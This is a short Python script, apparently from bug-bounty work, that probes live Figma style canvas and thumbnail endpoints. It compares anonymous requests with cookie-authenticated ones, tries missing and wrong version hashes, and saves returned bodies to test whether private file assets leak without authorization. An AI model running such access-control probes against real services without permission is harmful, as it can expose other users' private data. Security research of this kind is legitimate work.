"""file_proxy style canvas + thumbnail 匿名 vs 登录 测试

styles 响应里服务端直接下发 canvas_url/thumbnail_url（JS schema 确认）。
创造目标：canvas 接口的鉴权可能只校验 ver 哈希是否有效，
不校验请求者对文件权限 → 匿名拿私有文件样式资产。

URL（来自 ds_styles 响应，确定性来源）：
  /api/file_proxy/style/{key}/canvas?ver=N4l2fHwfqtsjBoJGQMXKc6
  /style/{key}/thumbnail?ver=N4l2fHwfqtsjBoJGQMXKc6
"""
import json, sys
import requests

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

SESS = json.load(open(r"D:\scan\_figma_hunt\figma_session.json"))
CK = {c["name"]: c["value"] for c in SESS if c.get("name") and c.get("value")}
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36"}

KEY = "c2f0e9a03b9f7ae6f69b24c8f620bc7839f5ed28"
VER = "N4l2fHwfqtsjBoJGQMXKc6"

URLS = [
    f"/api/file_proxy/style/{KEY}/canvas?ver={VER}",
    f"/style/{KEY}/thumbnail?ver={VER}",
    f"/api/file_proxy/style/{KEY}/canvas",
    f"/style/{KEY}/thumbnail",
    f"/api/file_proxy/style/{KEY}/canvas?ver=wronghash",
    f"/style/{KEY}/thumbnail?ver=wronghash",
]


def test(url, cookies=None, save=None):
    try:
        r = requests.get("https://www.figma.com" + url, cookies=cookies, headers=UA, timeout=15)
        ct = r.headers.get("Content-Type", "")
        body = r.content
        info = f"{len(body)}B ct={ct}"
        if "json" in ct:
            info += " " + body[:200].decode(errors="replace").replace("\n", " ")
        elif body[:8] == b"<!DOCTYPE":
            info += " (SPA HTML)"
        else:
            info += " magic=" + body[:16].hex()
        if save and r.status_code == 200 and body[:8] != b"<!DOCTYPE":
            open(save, "wb").write(body)
        print(f"  {r.status_code} | {info}")
        return r.status_code, body
    except Exception as e:
        print(f"  ERR {type(e).__name__} {e}")
        return None, None


print("=== 匿名 vs 登录（私有文件样式资产） ===")
for u in URLS:
    print(f"\n{u}")
    a = test(u, save="anon_style_canvas.bin")
    b = test(u, CK, save="auth_style_canvas.bin")
    if a[0] == 200 and b[0] == 200 and a[1] != b[1]:
        print("  <<< 200 且内容不同：匿名拿到了私有数据!")
    elif a[0] == 200 and b[0] == 200 and a[1] == b[1]:
        print("  <<< 200 且内容相同")
